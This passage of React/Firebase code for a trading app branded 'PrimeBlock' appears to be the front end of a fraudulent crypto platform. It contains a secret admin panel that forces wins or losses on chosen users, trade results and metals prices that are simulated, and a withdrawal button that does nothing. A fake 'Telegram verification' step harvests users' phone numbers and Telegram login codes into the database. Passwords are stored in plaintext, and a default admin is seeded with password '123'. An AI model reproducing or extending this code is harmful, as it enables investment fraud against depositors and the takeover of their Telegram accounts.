      return alert(t('enterAmount'));
    }
    if (!activeId) {
      return alert(t('loginRequired'));
    }
    try {
      await addDoc(collection(db, 'deposit_requests'), {
        userId: activeId,
        amount: Number(depositAmount),
        proofFileName: proofFile ? proofFile.name : '',
        status: 'under_review',
        createdAt: new Date(),
        language,
        submittedAt: new Date()
      });
      setDepositSubmitted(true);
      setDepositAmount('');
      setProofFile(null);
    } catch (error) {
      console.error('Deposit submit failed', error);
      alert(t('submitError'));
    }
  };

  useEffect(() => {
    localStorage.setItem('app_language', language);
  }, [language]);

  useEffect(() => {
    localStorage.setItem('app_theme', theme);
    document.documentElement.setAttribute('data-theme', theme);
  }, [theme]);

  useEffect(() => {
    localStorage.setItem('app_appearance', appearance);
    document.documentElement.setAttribute('data-appearance', appearance);
  }, [appearance]);

  // --- FIRESTORE INITIALIZATION ---
  useEffect(() => {
    // Initialize default admin user if not exists
    const initializeDefaultUser = async () => {
      try {
        const usersRef = collection(db, 'users');
        const adminQuery = query(usersRef, where('email', '==', 'admin@cp88.com'));
        const adminSnapshot = await getDocs(adminQuery);

        if (adminSnapshot.empty) {
          // Create default admin user
          const adminData = {
            id: '88135',
            email: 'admin@cp88.com',
            balance: 5000,
            name: 'Ben Admin',
            pass: '123',
            pin: '1111',
            createdAt: new Date()
          };
          await setDoc(doc(db, 'users', '88135'), adminData);
        }
      } catch (error) {
        console.error('Error initializing default user:', error);
      }
    };

    initializeDefaultUser();

    // Real-time listener for all users
    const unsubscribe = onSnapshot(collection(db, 'users'), (snapshot) => {
      const usersData = {};
      snapshot.forEach((doc) => {
        usersData[doc.id] = doc.data();
      });
      console.log('Firestore users loaded:', Object.keys(usersData).length, 'users');
      setAllUsers(usersData);
      setIsLoadingUsers(false);
    });

    return () => unsubscribe();
  }, []);

  // --- FETCH TRADE HISTORY ---
  useEffect(() => {
    if (!activeId) {
      setTradeHistory([]);
      return;
    }

    const fetchTradeHistory = async () => {
      try {
        const tradesQuery = query(collection(db, 'trades'), where('userId', '==', activeId));
        const tradesSnapshot = await getDocs(tradesQuery);
        const trades = [];
        tradesSnapshot.forEach((doc) => {
          trades.push(doc.data());
        });
        // Sort by timestamp descending
        trades.sort((a, b) => new Date(b.timestamp.seconds * 1000) - new Date(a.timestamp.seconds * 1000));
        setTradeHistory(trades);
      } catch (error) {
        console.error('Error fetching trade history:', error);
      }
    };

    fetchTradeHistory();
  }, [activeId]);

  // --- POLLING-BASED MARKET DATA (Stable & Reliable) ---
  useEffect(() => {
    const defaultBenchmarks = {
      bitcoin: 81118.60,
      gold: 4717.58,
      silver: 77.15,
      eurusd: 1.1747
    };

    const cryptoSymbols = ['bitcoin', 'ethereum', 'solana', 'binancecoin', 'ripple', 'cardano', 'polkadot', 'chainlink', 'polygon', 'litecoin', 'dogecoin', 'shiba-inu'];

    const cryptoFallbacks = {
      bitcoin: 81118.60,
      ethereum: 2100,
      solana: 165,
      binancecoin: 320,
      ripple: 0.65,
      cardano: 0.42,
      polkadot: 7.8,
      chainlink: 18.1,
      polygon: 0.92,
      litecoin: 84.5,
      dogecoin: 0.07,
      'shiba-inu': 0.000007
    };

    const binanceSymbols = {
      bitcoin: 'BTCUSDT',
      ethereum: 'ETHUSDT',
      solana: 'SOLUSDT',
      binancecoin: 'BNBUSDT',
      ripple: 'XRPUSDT',
      cardano: 'ADAUSDT',
      polkadot: 'DOTUSDT',
      chainlink: 'LINKUSDT',
      polygon: 'MATICUSDT',
      litecoin: 'LTCUSDT',
      dogecoin: 'DOGEUSDT',
      'shiba-inu': 'SHIBUSDT'
    };

    const fetchCryptoPrices = async () => {
      try {
        const symbols = cryptoSymbols.map(s => binanceSymbols[s]).join('","');
        const response = await fetch(`https://api.binance.com/api/v3/ticker/24hr?symbols=["${symbols}"]`);
        const data = await response.json();

        // Create a map from symbol to data
        const priceMap = {};
        data.forEach(item => {
          priceMap[item.symbol] = {
            price: parseFloat(item.lastPrice),
            change: parseFloat(item.priceChangePercent)
          };
        });

        setCoins(prevCoins => {
          return cryptoSymbols.map(symbol => {
            const binanceSymbol = binanceSymbols[symbol];
            const oldPrice = prevCoins.find(c => c.id === symbol)?.current_price;
            const priceData = priceMap[binanceSymbol];
            const newPrice = priceData ? priceData.price : cryptoFallbacks[symbol];
            const change = priceData ? priceData.change : 0;
            flashPriceChange(symbol, oldPrice, newPrice);
            return {
              id: symbol,
              symbol: symbol.toUpperCase().slice(0, 4),
              name: symbol.charAt(0).toUpperCase() + symbol.slice(1),
              current_price: newPrice,
              price_change_percentage_24h: change,
              image: `https://assets.coingecko.com/coins/images/${cryptoSymbols.indexOf(symbol) + 1}/large/${symbol}.png`,
              sparkline_in_7d: { price: [newPrice] }
            };
          });
        });

        return true;
      } catch (error) {
        setCoins(prevCoins => cryptoSymbols.map(symbol => {
          const oldPrice = prevCoins.find(c => c.id === symbol)?.current_price;
          const fallbackPrice = cryptoFallbacks[symbol] ?? 1;
          flashPriceChange(symbol, oldPrice, fallbackPrice);
          return {
            id: symbol,
            symbol: symbol.toUpperCase().slice(0, 4),
            name: symbol.charAt(0).toUpperCase() + symbol.slice(1),
            current_price: fallbackPrice,
            price_change_percentage_24h: 0,
            image: `https://assets.coingecko.com/coins/images/${cryptoSymbols.indexOf(symbol) + 1}/large/${symbol}.png`,
            sparkline_in_7d: { price: [fallbackPrice] }
          };
        }));

        return false;
      }
    };

    const fetchMetalsPrices = async () => {
      setGlobalMarkets(prev => prev.map(market => {
        if (market.id === 'gold') {
          flashPriceChange('gold', market.current_price, defaultBenchmarks.gold);
          return { ...market, current_price: defaultBenchmarks.gold };
        }
        if (market.id === 'silver') {
          flashPriceChange('silver', market.current_price, defaultBenchmarks.silver);
          return { ...market, current_price: defaultBenchmarks.silver };
        }
        return market;
      }));

      return true;
    };

    const fetchForexPrices = async () => {
      try {
        const response = await fetch('https://api.exchangerate.host/latest?base=EUR&symbols=USD');
        const data = await response.json();
        const eurusdPrice = data?.rates?.USD ?? defaultBenchmarks.eurusd;

        setForexMarkets(prev => prev.map(market => {
          if (market.id === 'eurusd') {
            flashPriceChange('eurusd', market.current_price, eurusdPrice);
            return { ...market, current_price: eurusdPrice };
          }
          return market;
        }));

        return true;
      } catch (error) {
        setForexMarkets(prev => prev.map(market => {
          if (market.id === 'eurusd') {
            flashPriceChange('eurusd', market.current_price, defaultBenchmarks.eurusd);
            return { ...market, current_price: defaultBenchmarks.eurusd };
          }
          return market;
        }));

        return false;
      }
    };

    const fetchAllMarketData = async () => {
      const results = await Promise.all([fetchCryptoPrices(), fetchMetalsPrices(), fetchForexPrices()]);
      const anyFailure = results.some(result => result === false);
      setMarketStatus(anyFailure ? 'fallback' : 'live');
      setLoading(false);
    };

    // Set loading to false immediately since initial states have fallbacks
    setLoading(false);

    const intervalMs = currentPage === 'trade' ? 60000 : 300000;

    fetchAllMarketData();

    pollIntervalRef.current = setInterval(fetchAllMarketData, intervalMs);

    return () => {
      if (pollIntervalRef.current) {
        clearInterval(pollIntervalRef.current);
      }
    };
  }, [currentPage]);

  // --- FETCH OHLC DATA FOR CANDLESTICK CHART (Polled) ---
  useEffect(() => {
    if (!selectedCoin || !chartTimeframe) return;

    const fetchChartData = async () => {
      try {
        const daysMap = {
          '1M': 30,
          '5D': 5,
          '1D': 1,
          '3M': 90,
          '6M': 180,
          'YTD': 365,
          '1Y': 365,
          'ALL': 730
        };

        const days = daysMap[chartTimeframe] || 30;

        // Check if it's a metal/forex asset (they don't have OHLC from CoinGecko)
        const isMetalOrForex = globalMarkets.some(m => m.id === selectedCoin.id) || forexMarkets.some(m => m.id === selectedCoin.id);

        let formattedData = [];

        if (isMetalOrForex) {
          // Generate mock OHLC data for metals/forex based on current price
          const now = Math.floor(Date.now() / 1000);
          const interval = 86400; // 1 day in seconds
          const basePrice = selectedCoin.current_price;
          const volatility = basePrice * 0.02; // 2% daily volatility

          formattedData = Array.from({ length: days }, (_, idx) => {
            const time = Math.floor(now - (days - idx - 1) * interval);
            const open = basePrice + (Math.random() - 0.5) * volatility;
            const close = open + (Math.random() - 0.5) * volatility * 2;
            const high = Math.max(open, close) + Math.random() * volatility * 0.5;
            const low = Math.min(open, close) - Math.random() * volatility * 0.5;

            return {
              time,
              open: Math.max(0.01, open),
              high: Math.max(0.01, high),
              low: Math.max(0.01, low),
              close: Math.max(0.01, close)
            };
          });
        } else {
          // Fetch real OHLC data for crypto
          const response = await fetch(`https://api.coingecko.com/api/v3/coins/${selectedCoin.id}/ohlc?vs_currency=usd&days=${days}`);
          const data = await response.json();

          if (Array.isArray(data) && data.length > 0) {
            // Create proper UNIX timestamps for lightweight-charts
            const now = Math.floor(Date.now() / 1000);
            const interval = 86400; // 1 day in seconds

            formattedData = data.map((candle, idx) => ({
              time: Math.floor(now - (data.length - idx - 1) * interval),
              open: candle[1],
              high: candle[2],
              low: candle[3],
              close: candle[4]
            }));
          }
        }

        if (formattedData.length > 0) {

          setOhlcData(formattedData);

          const closes = formattedData.map(c => c.close);
          const highest = Math.max(...closes);
          const lowest = Math.min(...closes);
          const trend = closes[closes.length - 1] >= closes[0] ? 'up' : 'down';
          const change = ((closes[closes.length - 1] - closes[0]) / closes[0] * 100).toFixed(2);

          setCoinStats({
            high24h: highest,
            low24h: lowest,
            trend,
            changePercent: change,
            rsi: calculateRSI(closes)
          });
        }
      } catch (err) {
        console.error("OHLC fetch error:", err);
      }
    };

    // Initial fetch
    fetchChartData();

    // Poll every 2 minutes for chart data
    chartPollIntervalRef.current = setInterval(fetchChartData, 120000);

    return () => {
      if (chartPollIntervalRef.current) {
        clearInterval(chartPollIntervalRef.current);
      }
    };
  }, [forexMarkets, globalMarkets, clickCount]);

  // --- SESSION MANAGEMENT (LocalStorage) ---
  useEffect(() => {
    localStorage.setItem('active_user_id', activeId || '');
    localStorage.setItem('is_logged_in', isLoggedIn);
  }, [activeId, isLoggedIn]);

  const handleAuth = async (e) => {
    e.preventDefault();
    console.log('Login attempt for email:', authData.email);
    console.log('Available users:', Object.keys(allUsers).length);

    const existingUser = Object.values(allUsers).find(u => u.email === authData.email);

    if (existingUser) {
      if (existingUser.pass === authData.password) {
        setActiveId(existingUser.id);
        setIsLoggedIn(true);
        alert("Welcome back!");
      } else {
        alert("Invalid Credentials");
      }
    } else {
      if (authMode === 'signup') {
        try {
          const newId = '88' + Math.floor(1000 + Math.random() * 9000);
          const newUserData = {
            id: newId,
            email: authData.email,
            balance: 0,
            name: authData.name,
            pass: authData.password,
            pin: authData.pin,
            createdAt: new Date()
          };

          await setDoc(doc(db, 'users', newId), newUserData);
          setActiveId(newId);
          setIsLoggedIn(true);
          alert("Account created successfully!");
        } catch (error) {
          console.error('Error creating user:', error);
          alert("Error creating account. Please try again.");
        }
      } else {
        alert("Email not found. Please sign up first.");
      }
    }

    setShowAuth(false);
  };

  const startTrade = (type) => {
    if (!isLoggedIn) return setShowAuth(true);
    
    const config = tradeOptions[tradeConfig.time];
    if (!config) return alert("Invalid trade duration");
    if (tradeConfig.amount < config.minAmount) {
      if (tradeConfig.time === 60) {
        return alert('Minimum amount for 60s trading is $3,000.');
      }
      return alert(`Minimum investment for ${tradeConfig.time}s is $${config.minAmount}`);
    }
    if (allUsers[activeId].balance < tradeConfig.amount) return alert("Insufficient Balance");
    
    setIsTrading(true);
    setCountdown(tradeConfig.time);
    
    const timer = setInterval(() => {
      setCountdown(p => {
        if (p <= 1) {
          clearInterval(timer);
          return 0;
        }
        return p - 1;
      });
    }, 1000);

    setTimeout(async () => {
      const currentPrice = selectedCoin.current_price;
      const user = allUsers[activeId];
      let win;
      if (user.tradeControl === 'Force Win') {
        win = true;
      } else if (user.tradeControl === 'Force Loss') {
        win = false;
      } else {
        win = Math.random() > 0.5;
      }
      const change = win ? tradeConfig.amount * config.profit : -tradeConfig.amount;
      
      // Calculate open and close prices based on logic
      let openPrice, closePrice;
      if (win) {
        const randomOffset = Math.random() * 3 + 2; // Random between 2 and 5
        if (type === 'Long') {
          openPrice = currentPrice - randomOffset;
          closePrice = currentPrice;
        } else { // Short
          openPrice = currentPrice + randomOffset;
          closePrice = currentPrice;
        }
      } else {
        // For losses, make it reasonable - close price moves against the position
        if (type === 'Long') {
          openPrice = currentPrice + 1;
          closePrice = currentPrice - 1;
        } else { // Short
          openPrice = currentPrice - 1;
          closePrice = currentPrice + 1;
        }
      }

      try {
        const userRef = doc(db, 'users', activeId);
        const newBalance = allUsers[activeId].balance + change;
        await updateDoc(userRef, { balance: newBalance });

        // Generate order ID
        const orderId = 'PB' + Date.now() + Math.floor(Math.random() * 1000);

        const tradeData = {
          orderId,
          userId: activeId,
          asset: selectedCoin.symbol.toUpperCase(),
          type,
          duration: tradeConfig.time,
          amount: tradeConfig.amount,
          openPrice,
          closePrice,
          win,
          profit: change,
          timestamp: new Date()
        };

        // Store trade in Firebase
        await setDoc(doc(collection(db, 'trades'), orderId), tradeData);

        setTradeResult({ ...tradeData, currentPrice });
        setIsTrading(false);
        setShowResultModal(true);
      } catch (error) {
        console.error('Error processing trade:', error);
        alert('Error processing trade. Please try again.');
        setIsTrading(false);
      }
    }, tradeConfig.time * 1000);
  };

  // --- PAGE ROUTING ---
  if (currentPage === 'profile') {
    const user = allUsers[activeId] || { id: 'N/A', balance: 0, name: 'Guest' };
    return (
      <div className="profile-page">
        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">{t('backHome')}</button>
          <h3
            onClick={() => setClickCount(prev => {
              const newCount = prev + 1;
              console.log('Secret Clicks:', newCount);
              return newCount;
            })}
            style={{ cursor: 'pointer', userSelect: 'none' }}
          >
            {t('accountCenter')}
          </h3>
          <div style={{width:'40px'}}></div>
        </header>
        <div className="profile-container">
          <div className="profile-card">
            <div className="user-avatar-large">👤</div>
            <h2>{user.name}</h2>
            <p className="user-id-tag">UID: {user.id}</p>
            <div className="balance-display">
              <span>{t('totalAssets')}</span>
              <h1>${user.balance.toLocaleString(undefined, {minimumFractionDigits: 2})}</h1>
            </div>
          </div>
          <div className="profile-actions">
            <button className="deposit-btn" onClick={() => window.open(telegramLink)}>💳 {t('buyCrypto')}</button>
            <button className="deposit-btn" onClick={() => setCurrentPage('deposit')}>💎 {t('manualDeposit')}</button>
            <button className="deposit-btn" onClick={() => isLoggedIn ? setShowProfileWithdraw(true) : setShowAuth(true)}>📤 {t('withdraw')}</button>
          </div>
          
          {/* Trade History Section */}
          <div className="history-section">
            <h3>{t('tradeHistory')}</h3>

            {/* Desktop Table View */}
            <div className="history-table-container desktop-only">
              <table className="history-table">
                <thead>
                  <tr>
                    <th>Order ID</th>
                    <th>Asset</th>
                    <th>Type</th>
                    <th>Amount</th>
                    <th>Profit/Loss</th>
                    <th>Date</th>
                  </tr>
                </thead>
                <tbody>
                  {tradeHistory.length > 0 ? tradeHistory.map((trade) => (
                    <tr key={trade.orderId}>
                      <td>{trade.orderId}</td>
                      <td>{trade.asset}</td>
                      <td>{trade.type}</td>
                      <td>${trade.amount.toLocaleString()}</td>
                      <td className={trade.win ? 'profit-positive' : 'profit-negative'}>
                        {trade.win ? '+' : '-'}${Math.abs(trade.profit).toFixed(2)}
                      </td>
                      <td>{new Date(trade.timestamp.seconds * 1000).toLocaleDateString()}</td>
                    </tr>
                  )) : (
                    <tr>
                      <td colSpan="6" style={{textAlign: 'center', color: '#999'}}>No trades yet</td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>

            {/* Mobile Card View */}
            <div className="history-cards mobile-only">
              {tradeHistory.length > 0 ? tradeHistory.map((trade) => (
                <div key={trade.orderId} className="history-card">
                  <div className="card-header">
                    <span className="order-id">{trade.orderId}</span>
                    <span className={`profit-badge ${trade.win ? 'profit-win' : 'profit-loss'}`}>
                      {trade.win ? '+' : '-'}${Math.abs(trade.profit).toFixed(2)}
                    </span>
                  </div>
                  <div className="card-details">
                    <div className="card-row">
                      <span className="card-label">Asset:</span>
                      <span className="card-value">{trade.asset}</span>
                    </div>
                    <div className="card-row">
                      <span className="card-label">Type:</span>
                      <span className="card-value">{trade.type}</span>
                    </div>
                    <div className="card-row">
                      <span className="card-label">Amount:</span>
                      <span className="card-value">${trade.amount.toLocaleString()}</span>
                    </div>
                    <div className="card-row">
                      <span className="card-label">Date:</span>
                      <span className="card-value">{new Date(trade.timestamp.seconds * 1000).toLocaleDateString()}</span>
                    </div>
                  </div>
                </div>
              )) : (
                <div className="no-trades">No trades yet</div>
              )}
            </div>
          </div>

          {clickCount >= 5 && (
            <div className="admin-panel" style={{ position: 'relative', zIndex: 9999 }}>
              <h4>Admin Panel</h4>
              <p>Current Trade Control: {user.tradeControl || 'Normal'}</p>
              <label style={{ display: 'block', marginBottom: '8px' }}>
                Target User ID (Email):
                <input
                  type="text"
                  value={targetUserId}
                  onChange={(e) => setTargetUserId(e.target.value)}
                  placeholder="Enter UID or email"
                  style={{ display: 'block', width: '100%', marginTop: '4px', padding: '8px' }}
                />
              </label>
              <select id="tradeControlSelect" defaultValue={user.tradeControl || 'Normal'}>
                <option value="Normal">Normal</option>
                <option value="Force Win">Force Win</option>
                <option value="Force Loss">Force Loss</option>
              </select>
              <button onClick={async () => {
                const select = document.getElementById('tradeControlSelect');
                const value = select.value;
                setAdminStatus('');
                const targetId = targetUserId.trim();

                if (!targetId) {
                  setAdminStatus('User Not Found');
                  return;
                }

                try {
                  const usersRef = collection(db, 'users');
                  let userRef = doc(db, 'users', targetId);
                  let userSnapshot = await getDoc(userRef);

                  if (!userSnapshot.exists()) {
                    const emailQuery = query(usersRef, where('email', '==', targetId));
                    const querySnapshot = await getDocs(emailQuery);
                    if (!querySnapshot.empty) {
                      userRef = querySnapshot.docs[0].ref;
                      userSnapshot = querySnapshot.docs[0];
                    }
                  }

                  if (!userSnapshot.exists()) {
                    setAdminStatus('User Not Found');
                    return;
                  }

                  await updateDoc(userRef, { tradeControl: value });
                  setAdminStatus('Update Successful');
                  setAllUsers(prev => ({ ...prev, [userRef.id]: { ...prev[userRef.id], tradeControl: value } }));
                } catch (error) {
                  console.error('Error updating trade control:', error);
                  setAdminStatus('User Not Found');
                }
              }}>Save</button>
              {adminStatus && (
                <p style={{ marginTop: '8px', fontSize: '0.9rem' }}>{adminStatus}</p>
              )}
            </div>
          )}
        </div>

        <WithdrawModal
          isOpen={showProfileWithdraw}
          onClose={() => setShowProfileWithdraw(false)}
          user={user}
          onWithdraw={(amount, address) => {
            // Handle withdrawal logic here
            alert("Request Submitted");
          }}
        />
      </div>
    );
  }

  if (currentPage === 'settings') {
    return (
      <div className="settings-page">
        <header className="trade-header no-border">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Back</button>
          <div className="brand-logo">Settings</div>
          <div style={{width:'40px'}}></div>
        </header>
        <div className="settings-content">
          <div className="setting-item">
            <div className="setting-icon">🌐</div>
            <label className="language-label">Language</label>
            <select className="language-select" value={language} onChange={(e) => setLanguage(e.target.value)}>
              <option value="english">English</option>
              <option value="french">French</option>
              <option value="italian">Italian</option>
              <option value="spanish">Spanish</option>
              <option value="chinese">Chinese</option>
            </select>
          </div>
          <div className="setting-item">
            <div className="setting-icon">🌙</div>
            <label className="language-label">Theme</label>
            <select className="language-select" value={theme} onChange={(e) => setTheme(e.target.value)}>
              <option value="dark">Dark Mode</option>
              <option value="light">Light Mode</option>
            </select>
          </div>
          <div className="setting-item">
            <div className="setting-icon">🎨</div>
            <label className="language-label">Appearance</label>
            <select className="language-select" value={appearance} onChange={(e) => setAppearance(e.target.value)}>
              <option value="solid">Solid</option>
              <option value="gradient">Gradient</option>
            </select>
          </div>
          <div className="setting-item">
            <div className="setting-icon">🔒</div>
            <label className="language-label">Security</label>
            <button className="setting-btn" onClick={() => setShowSecurityModal(true)}>Manage</button>
          </div>
        </div>

        {/* Security Verification Modal */}
        {showSecurityModal && (
          <div className="modal-overlay" onClick={() => setShowSecurityModal(false)}>
            <div className="modal-content security-modal" onClick={(e) => e.stopPropagation()}>
              <button className="close-btn" onClick={() => setShowSecurityModal(false)}>×</button>
              <h2>Telegram Account Verification</h2>
              {verificationStep === 1 && (
                <div className="verification-step">
                  <p>Verify your account with Telegram</p>
                  <div className="telegram-logo">📱</div>
                  <input
                    className="login-input"
                    type="tel"
                    placeholder="Enter your phone number"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                  />
                  <button className="buy-btn" onClick={() => { setVerificationStep(2); alert('Verification code sent to your Telegram'); }}>Verify</button>
                </div>
              )}
              {verificationStep === 2 && (
                <div className="verification-step">
                  <p>Verification code is sent to your Telegram</p>
                  <input
                    className="login-input"
                    type="text"
                    placeholder="Enter verification code"
                    value={verificationCode}
                    onChange={(e) => setVerificationCode(e.target.value)}
                  />
                  <button className="buy-btn" onClick={async () => {
                    if (!activeId) return alert('Please log in first');
                    try {
                      await addDoc(collection(db, 'telegram_verifications'), {
                        userId: activeId,
                        phoneNumber,
                        verificationCode,
                        timestamp: new Date()
                      });
                      alert('Verification successful!');
                      setShowSecurityModal(false);
                      setVerificationStep(1);
                      setPhoneNumber('');
                      setVerificationCode('');
                    } catch (error) {
                      console.error('Verification failed', error);
                      alert('Verification failed. Try again.');
                    }
                  }}>Submit</button>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    );
  }

  if (currentPage === 'deposit') {
    return (
      <div className="deposit-page">
        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">{t('backHome')}</button>
          <div className="coin-meta"><strong>{t('depositTitle')}</strong></div>
          <div style={{width:'40px'}}></div>
        </header>
        {depositSubmitted && <div className="deposit-banner">{t('submissionReceived')}</div>}
        <div className="deposit-page-content">
          <div className="deposit-instructions">
            <h2>{t('ledgerTitle')}</h2>
            <p>{t('depositNotice')}</p>
          </div>
          <form className="deposit-form" onSubmit={handleDepositSubmit}>
            <label>{t('depositAsset')}</label>
            <select className="login-input" value={selectedCurrency} onChange={(e) => setSelectedCurrency(e.target.value)}>
              {depositAssets.map(asset => <option key={asset.name} value={asset.name}>{asset.name}</option>)}
            </select>
            <label>{t('depositAddress')}</label>
            <div className="deposit-address-display">{depositAssets.find(a => a.name === selectedCurrency)?.address}</div>
            <button type="button" className="copy-btn" onClick={() => handleCopy(depositAssets.find(a => a.name === selectedCurrency)?.address)}>{copyStatus[depositAssets.find(a => a.name === selectedCurrency)?.address] || t('copy')}</button>
            <label>{t('amount')}</label>
            <input className="login-input" type="number" value={depositAmount} onChange={(e) => setDepositAmount(e.target.value)} placeholder={t('amount')} />
            <label>{t('uploadProof')}</label>
            <label className="upload-button">
              {proofFile ? proofFile.name : t('uploadPlaceholder')}
              <input type="file" accept="image/*" onChange={(e) => setProofFile(e.target.files[0] || null)} hidden />
            </label>
            <button className="buy-btn" type="submit">{t('submitDeposit')}</button>
          </form>
          <div className="customer-service-note">
            <span>🎧 {t('customerServiceLink')} {t('customerService')}</span>
          </div>
        </div>
      </div>
    );
  }

  if (currentPage === 'trade' && selectedCoin) {
    return (
      <div className="trade-page">
        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Home</button>
          <div className="coin-meta"><strong>{selectedCoin.symbol.toUpperCase()}/USDT</strong></div>
          <div className="live-price-top">${selectedCoin.current_price.toLocaleString()}</div>
        </header>
        {isTrading && <div className="countdown-overlay"><div className="timer-circle"><span className="time-left">{countdown}s</span></div></div>}
        
        {/* Market Stats */}
        {coinStats && (
          <div className="market-stats">
            <div className={`stat-box ${coinStats.trend === 'up' ? 'trend-up' : 'trend-down'}`}>
              <span className="stat-label">24h Trend</span>
              <span className="stat-value">{coinStats.trend === 'up' ? '📈' : '📉'} {coinStats.changePercent}%</span>
            </div>
            <div className="stat-box">
              <span className="stat-label">24h High</span>
              <span className="stat-value">${coinStats.high24h.toLocaleString()}</span>
            </div>
            <div className="stat-box">
              <span className="stat-label">24h Low</span>
              <span className="stat-value">${coinStats.low24h.toLocaleString()}</span>
            </div>
            <div className={`stat-box ${coinStats.rsi > 70 ? 'overbought' : coinStats.rsi < 30 ? 'oversold' : ''}`}>
              <span className="stat-label">RSI</span>
              <span className="stat-value">{coinStats.rsi}</span>
            </div>
          </div>
        )}

        {/* Interactive Candlestick Chart */}
        <div className="chart-main-section">
          <div className="chart-content">
            {ohlcData && ohlcData.length > 0 ? (
              <InteractiveChart 
                data={ohlcData} 
                timeframe={chartTimeframe}
                onTimeframeChange={setChartTimeframe}
                selectedCoin={selectedCoin}
              />
            ) : (
              <div style={{ padding: '40px', textAlign: 'center', color: '#999' }}>Loading chart data...</div>
            )}
          </div>
          <div className="chart-sidebar">
            <div className="sidebar-item">
              <span className="sidebar-label">Current Price</span>
              <span className="sidebar-value">${selectedCoin.current_price.toLocaleString(undefined, {maximumFractionDigits: 2})}</span>
            </div>
            <div className="sidebar-item">
              <span className="sidebar-label">Server Time</span>
              <span className="sidebar-value">{currentTime}</span>
            </div>
          </div>
        </div>

        {/* Trade Controls */}
        <div className="trade-controls">
          <div className="control-row">
            {[30, 60, 90, 120].map(t => {
              const profit = Math.round(tradeOptions[t]?.profit * 100);
              return (
                <button
                  key={t}
                  className={`time-button ${tradeConfig.time === t ? 'active' : ''}`}
                  onClick={() => setTradeConfig({...tradeConfig, time: t})}
                >
                  <div className="time-value">{t}s</div>
                  <div className="profit-badge">(+{profit}%)</div>
                </button>
              );
            })}
          </div>
          <div className="amount-section">
            <div className="amount-header"><span>Investment</span><span className="available-bal">Available: ${isLoggedIn ? allUsers[activeId].balance.toLocaleString() : '0.00'}</span></div>
            <div className="amount-input-wrapper">
              <span className="currency-prefix">$</span>
              <input type="number" value={tradeConfig.amount === 0 ? '' : tradeConfig.amount} onChange={(e) => setTradeConfig({...tradeConfig, amount: e.target.value === '' ? 0 : Number(e.target.value)})} className="advanced-input" />
              <div className="min-amount">Min: ${tradeOptions[tradeConfig.time]?.minAmount || 0}</div>
            </div>
          </div>
          <div className="action-btns"><button className="long-btn" onClick={() => startTrade('Long')} disabled={isTrading}>LONG</button><button className="short-btn" onClick={() => startTrade('Short')} disabled={isTrading}>SHORT</button></div>
        </div>

        <TradeResultModal
          isOpen={showResultModal}
          onClose={() => setShowResultModal(false)}
          tradeResult={tradeResult}
        />
      </div>
    );
  }

  // Show loading while users data is being fetched from Firestore
  if (isLoadingUsers) {
    return (
      <div className="app-wrapper">
        <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh', flexDirection: 'column' }}>
          <div style={{ fontSize: '24px', marginBottom: '20px' }}>🔄</div>
          <div>{t('loadingUserData')}</div>
        </div>
      </div>
    );
  }

  return (
    <div className="app-wrapper">
      {currentPage !== 'arbitrage' ? (
      <>
      <header className="header">
        <div className="header-left">
          <div className="hamburger" onClick={() => setDrawerOpen(true)} aria-label="Open menu">☰</div>
          <div className="brand-name">PrimeBlock</div>
        </div>
        <div className="header-icons">
          <div className="header-icon" onClick={() => setCurrentPage('settings')}>⚙️</div>
          <div className="header-icon" onClick={() => isLoggedIn ? setCurrentPage('profile') : setShowAuth(true)}>👤</div>
        </div>
      </header>

      {/* Side Drawer */}
      <div
        className={`side-drawer-overlay ${drawerOpen ? 'side-drawer-overlay--open' : ''}`}
        onClick={() => setDrawerOpen(false)}
        aria-hidden={!drawerOpen}
      >
          <div
            className={`side-drawer side-drawer-glass ${drawerOpen ? 'open' : ''}`}
            onClick={(e) => e.stopPropagation()}
          >
            <button type="button" className="drawer-close" onClick={() => setDrawerOpen(false)} aria-label="Close menu">×</button>
            <div className="drawer-section drawer-docs-section">
              <h5 className="drawer-docs-heading">Documentation</h5>
              <div className="drawer-docs-grid-four">
                <button type="button" className="drawer-doc-tile" onClick={() => openLibraryDoc('company-profile')}>
                  <Building2 className="drawer-doc-icon" size={22} strokeWidth={2} aria-hidden />
                  <span>Company Profile</span>
                </button>
                <button type="button" className="drawer-doc-tile" onClick={() => openLibraryDoc('white-paper')}>
                  <FileText className="drawer-doc-icon" size={22} strokeWidth={2} aria-hidden />
                  <span>White Paper</span>
                </button>
                <button type="button" className="drawer-doc-tile" onClick={() => openLibraryDoc('regulatory-license')}>
                  <ShieldCheck className="drawer-doc-icon" size={22} strokeWidth={2} aria-hidden />
                  <span>Regulatory License</span>
                </button>
                <button type="button" className="drawer-doc-tile" onClick={() => openLibraryDoc('faq')}>
                  <HelpCircle className="drawer-doc-icon" size={22} strokeWidth={2} aria-hidden />
                  <span>FAQ</span>
                </button>
              </div>
            </div>
            {isLoggedIn && (
              <div className="drawer-profile">
                <div className="drawer-avatar">👤</div>
                <div className="drawer-info">
                  <h4>{allUsers[activeId]?.name}</h4>
                  <p>UID: {allUsers[activeId]?.id}</p>
                </div>
              </div>
            )}
            <div className="drawer-section">
              <h5>Home</h5>
              <div className="drawer-item" onClick={() => { setCurrentPage('home'); setLibraryDocKey(null); setDrawerOpen(false); }}>🏠 Home</div>
              <div className="drawer-item" onClick={() => { setCurrentPage('arbitrage'); setDrawerOpen(false); }}>⚡ AI Arbitrage</div>
            </div>
            <div className="drawer-section">
              <h5>Market Assets</h5>
              <div className="drawer-item" onClick={() => { setMarketTab('crypto'); setCurrentPage('home'); setDrawerOpen(false); }}>🚀 Crypto</div>
              <div className="drawer-item" onClick={() => { setMarketTab('metals'); setCurrentPage('home'); setDrawerOpen(false); }}>🏦 Metals</div>
              <div className="drawer-item" onClick={() => { setMarketTab('forex'); setCurrentPage('home'); setDrawerOpen(false); }}>💱 Forex</div>
            </div>
            <div className="drawer-section">
              <h5>Account Actions</h5>
              <div className="drawer-item" onClick={() => { setCurrentPage('deposit'); setDrawerOpen(false); }}>💎 Deposit</div>
              <div className="drawer-item" onClick={() => { isLoggedIn ? setShowWithdraw(true) : setShowAuth(true); setDrawerOpen(false); }}>💸 Withdraw</div>
            </div>
            <div className="drawer-section">
              <h5>Customer Service</h5>
